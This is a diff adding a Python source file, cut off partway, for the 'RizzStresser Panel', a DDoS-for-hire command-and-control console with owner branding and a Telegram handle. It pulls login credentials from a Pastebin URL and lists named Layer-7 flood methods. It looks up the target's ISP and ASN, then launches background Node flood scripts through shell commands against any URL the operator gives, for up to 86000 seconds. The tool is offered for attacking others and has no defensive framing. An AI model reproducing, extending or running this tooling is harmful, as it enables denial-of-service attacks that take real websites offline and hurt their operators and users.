@@ -1,0 +1,1372 @@
+from operator import index
+import socket
+import random
+import string
+import threading
+import getpass
+import urllib
+from colorama import Fore, Back
+import os,sys,time as t,re,requests,json
+from requests import post
+from time import sleep
+from datetime import datetime, date
+import codecs
+import os
+import json
+
+logged_in_user = None
+ip = requests.get('https://api.ipify.org').text.strip()
+ongoing_attacks = []
+MAX_CONCURRENT_ATTACKS = 3
+FILE_NAME = "assets/api.json"
+
+def display_api_list():
+    try:
+        with open(FILE_NAME, "r") as file:
+            data = json.load(file)
+
+        if not data:
+            print("(cnc) There are no APIs listed in the file")
+            return
+
+        print("(cnc) List of registered APIs:")
+        for index, api in enumerate(data, start=1):
+            base_url = api.get('base_url', 'No base_url')
+            api_key = api.get('api_key', 'No api_key')
+            print(f"{index}. Base URL: {base_url}, API Key: {api_key}")
+    
+    except FileNotFoundError:
+        print("(cnc) File 'api.json' not found")
+    except json.JSONDecodeError:
+        print("(cnc) An error occurred while reading the JSON file. Make sure the format is correct")
+    except Exception as e:
+        print(f"(cnc) An error occurred: {e}")
+
+def add_api(base_url, api_key):
+    if not base_url.strip() or not api_key.strip():
+        print("(cnc) Base URL and API Key cannot be empty!")
+        return
+    
+    try:
+        with open(FILE_NAME, "r") as file:
+            data = json.load(file)
+    except FileNotFoundError:
+        data = []
+
+    new_api = {"base_url": base_url, "api_key": api_key}
+    data.append(new_api)
+
+    with open(FILE_NAME, "w") as file:
+        json.dump(data, file, indent=4)
+
+    print("(cnc) API added successfully!")
+
+def delete_api(base_url):
+    if not os.path.exists(FILE_NAME):
+        print(f"(cnc) File '{FILE_NAME}' not found.")
+        return
+
+    with open(FILE_NAME, "r") as file:
+        try:
+            data = json.load(file)
+        except json.JSONDecodeError:
+            print("(cnc) Invalid JSON file.")
+            return
+
+    original_count = len(data)
+    data = [api for api in data if api.get("base_url") != base_url]
+
+    if len(data) < original_count:
+        with open(FILE_NAME, "w") as file:
+            json.dump(data, file, indent=4)
+        print(f"(cnc) API with base_url '{base_url}' removed successfully!")
+    else:
+        print(f"(cnc) API with base_url '{base_url}' not found")
+
+def waktu():
+    return datetime.now().strftime("%b/%d/%Y")
+
+def read_login_data_from_pastebin(pastebin_url):
+    try:
+        response = requests.get(pastebin_url)
+        if response.status_code == 200:
+            login_data = {}
+            lines = response.text.strip().split("\n")
+            for line in lines:
+                username, password = line.strip().split(":")
+                login_data[username] = password
+            return login_data
+        else:
+            print(f"(cnc) Error: Failed to access Pastebin (HTTP {response.status_code})")
+            return {}
+    except Exception as e:
+        print(f"(cnc) Error reading data from Pastebin: {e}")
+        return {}
+
+def login(login_data):
+    global logged_in_user
+    while True:
+        os.system('clear')
+        print("""
+\033[36m ⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[36m ⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
+\033[36m ⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
+\033[36m ⠀⠀⠀⠀⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
+\033[36m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
+\033[36m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
+""")
+        username = input("Username » ")
+        password = input("Password » ")
+        if username in login_data and login_data[username] == password:
+            logged_in_user = username
+            print(f"""
+(cnc) Login successful! Welcome, {username} 🪐!""")
+            t.sleep(1)
+            menu()
+            main()
+            return
+        else:
+            print("""
+(cnc) Incorrect username or password. Please try again""")
+            t.sleep(1)
+
+def methods():
+    os.system('clear')
+    
+    # Default methods jika file methods.json tidak ada
+    default_methods = [
+        {"name": "SUKI", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "H2GOD", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "GALAXY", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "H2FLASH", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "GLORY", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "H2BYPASS", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "H2FLOOD", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "HTTPS", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "HTTP-X", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "TLS", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "HOLD", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "STORM", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "MIX", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "RAW", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "NINJA", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+        {"name": "REFRESH", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
+    ]
+
+    try:
+        with open('assets/methods.json', 'r') as file:
+            methods_data = json.load(file)
+            if not methods_data:
+                methods_data = default_methods
+    except (FileNotFoundError, json.JSONDecodeError, ValueError):
+        methods_data = default_methods
+
+    # Tabel dengan warna (ANSI escape code)
+    print("\033[1;36m{:^9} │ {:^40} │ {:^8}\033[0m".format("NAME", "DESCRIPTION", "DURATION"))
+    print("\033[1;33m" + "──────────┼────────────────────────────────────────┼──────────" + "\033[0m")
+    
+    for method in methods_data:
+        print("\033[1;32m{:<9}\033[0m │ \033[1;35m{:<40}\033[0m │ \033[1;31m{:<8}\033[0m".format(
+            method['name'], method['description'], method['duration']
+        ))
+
+def get_ip_from_url(url):
+    try:
+        hostname = url.split("://")[-1].split("/")[0]
+        return socket.gethostbyname(hostname)
+    except socket.gaierror:
+        print(f"(cnc) cannot resolve {url}")
+    except ValueError:
+        print("(cnc) is invalid")
+        return {}
+
+def get_ip_info(ip):
+    try:
+        url = f"http://ip-api.com/json/{ip}?fields=status,isp,org,country,as"
+        response = requests.get(url)
+        data = response.json()
+        if data.get('status') != 'success':
+            return 'Unknown ASN', 'Unknown ISP', 'Unknown Org', 'Unknown Country'
+        return data.get('as', 'Unknown ASN'), data.get('isp', 'Unknown ISP'), data.get('org', 'Unknown Org'), data.get('country', 'Unknown Country')
+    except requests.RequestException as e:
+        print(f"(cnc) Error fetching IP data: {e}")
+        return 'Unknown ASN', 'Unknown ISP', 'Unknown Org', 'Unknown Country'
+
+def update_attacks():
+    global ongoing_attacks
+    while True:
+        current_time = t.time()
+        completed_attacks = [attack for attack in ongoing_attacks if current_time - attack['start_time'] >= attack['duration']]
+        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]
+        t.sleep(1)
+
+def ongoing():
+    if ongoing_attacks:
+        # Header Running
+        print("\033[38;5;201m" + " " * 22 + "Running" + "\033[0m")
+        print("\033[38;5;51m#  │ HOST            │ SINCE  │ DURATION │ METHOD    \033[0m")
+        print("\033[38;5;240m───┼─────────────────┼───────┼──────────┼──────────\033[0m")
+        
+        for i, attack in enumerate(ongoing_attacks, start=1):
+            elapsed_time = int(t.time() - attack['start_time'])
+            print(
+                f"\033[38;5;226m{i:<2}\033[0m │ "
+                f"\033[38;5;51m{attack['host']:<15}\033[0m │ "
+                f"\033[38;5;208m{elapsed_time:>5}\033[0m │ "
+                f"\033[38;5;82m{attack['duration']:>8}\033[0m │ "
+                f"\033[38;5;201m{attack['method']:<9}\033[0m"
+            )
+    else:
+        print("\033[38;5;208m(cnc) No running attacks, why not start some?\033[0m")
+
+def myinfo():
+    print(f"""
+\033[38;5;201mUsername      : \033[38;5;51m{logged_in_user}
+\033[38;5;201mConcurrents   : \033[38;5;51m3
+\033[38;5;201mTimelimit     : \033[38;5;51m86000
+\033[38;5;201mCooldown      : \033[38;5;51m0
+\033[38;5;201mExpiry        : \033[38;5;51m2739.73 Millennium(s) left
+\033[38;5;201mMy IP         : \033[38;5;51m{ip}:48970
+\033[38;5;201mMy Client     : \033[38;5;51mSSH-2.0-OpenSSH_9.9
+""")
+
+def credits():
+    print("""
+\033[38;5;201m============CREDITS============
+\033[38;5;51mVersion: \033[38;5;51m2.0
+\033[38;5;51mCreator: \033[38;5;51mRizz
+\033[38;5;51mWebsite: \033[38;5;51mComing Soon
+\033[38;5;201m==============END==============
+""")
+
+def help():
+    os.system('clear')
+    print("\033[1;36m" + "─" * 50)
+    print("\033[1;35m{:^50}".format("COMMANDS"))
+    print("\033[1;36m" + "─" * 50)
+    print("\033[1;33m{:<10} │ {:<18} │ {:<25}".format("NAME", "ALIAS", "DESCRIPTION"))
+    print("\033[1;36m" + "──────────┼────────────────────┼─────────────────────────")
+    
+    commands = [
+        ("help", "----", "Display all registered commands"),
+        ("methods", "----", "Display all registered methods"),
+        ("clear", "cls,c", "See your amazing banner"),
+        ("ongoing", "----", "View running attacks"),
+        ("exit", "goodbye,imaheadout", "Removes your session"),
+        ("credits", "whodoneit", "Credits"),
+        ("myinfo", "acccount,info", "Returns user info"),
+        ("attack", "----", "Attack with API"),
+        ("addapi", "----", "Add API"),
+        ("delapi", "----", "Delete API"),
+        ("listapi", "----", "List API"),
+        ("schedule", "----", "Attack with a specified time")
+    ]
+    
+    for name, alias, desc in commands:
+        print("\033[1;37m{:<10} │ {:<18} │ {:<25}".format(name, alias, desc))
+    
+    print("\033[1;36m" + "─" * 50)
+
+def menu():
+    os.system('clear')
+    print(f"""
+\033[38;5;201m ⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;205m ⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;213m ⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;141m ⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;135m ⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;99m ⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠀⠀⠀⠀⠀⠀
+\033[38;5;33m ⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀
+\033[38;5;39m ⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
+\033[38;5;51m ⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
+\033[38;5;50m ⠀⠀⠀⠀⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
+\033[38;5;46m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
+\033[38;5;82m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
+\033[38;5;118m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;154m ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
+
+\033[1;32mOWNER: \033[38;5;51m@slxughhter
+\033[1;32mUSERNAME: \033[38;5;51m{logged_in_user}
+\033[1;32mEXPIRY: \033[38;5;51m2739.73 Millennium(s)
+\033[1;32mTIMELIMIT: \033[38;5;51m86000
+\033[1;32mVIP: \033[38;5;51mtrue
+\033[1;32mCOOLDOWN: \033[38;5;51m0
+
+\033[1;36m          T.ME/slxughhter
+\033[1;36m    > Type "help" to start <
+""")
+
+def main():
+    global ongoing_attacks
+    threading.Thread(target=update_attacks, daemon=True).start()
+    while True:
+        sys.stdout.write(f"\x1b]2;[-] RizzStresser Panel || @slxughhter || t.me/slxughhter\x07")
+        sin = input(
+    f"\033[38;5;201m {logged_in_user} "  # pink cerah
+    f"\033[38;5;213m★ "                  # pink muda untuk bintang
+    f"\033[38;5;51mslxughhter \033[0m "  # cyan untuk owner
+    f"\033[38;5;240m➤ \033[0m"           # abu-abu gelap untuk prompt
+)
+        sinput = sin.split(" ")[0]
+        if sinput == "cls" or sinput == "c":
+            os.system('clear')
+            menu()
+        elif sinput == "stop":
+            ongoing_attacks = []
+            os.system('pkill screen')
+            menu()
+        elif sinput == "help":
+            help()
+        elif sinput == "myinfo" or sinput == "account" or sinput == "info":
+            myinfo()
+        elif sinput == "methods":
+            methods()
+        elif sinput == "ongoing":
+            ongoing()
+        elif sinput == "credits" or sinput == "whodoneit":
+            credits()
+        elif sinput == "addapi":
+            base_url = input("Enter Base URL: ").strip()
+            api_key = input("Enter API Key: ").strip()
+            add_api(base_url, api_key)
+        elif sinput == "delapi":
+            base_url = input("Enter the Base URL you want to delete: ").strip()
+            delete_api(base_url)
+        elif sinput == "listapi":
+            display_api_list()
+        elif sinput == "exit" or sinput == "goodbye" or sinput == "imaheadout":
+            print("(cnc) Goodbye !")
+            break
+        elif sinput == "":
+            print("(cnc) enter the correct input")
+
+        elif sinput == "suki" or sinput == "SUKI":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'suki',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node suki.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "h2god" or sinput == "H2GOD":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'h2god',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node god.js {url} {duration} 32 2')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "galaxy" or sinput == "GALAXY":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'galaxy',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
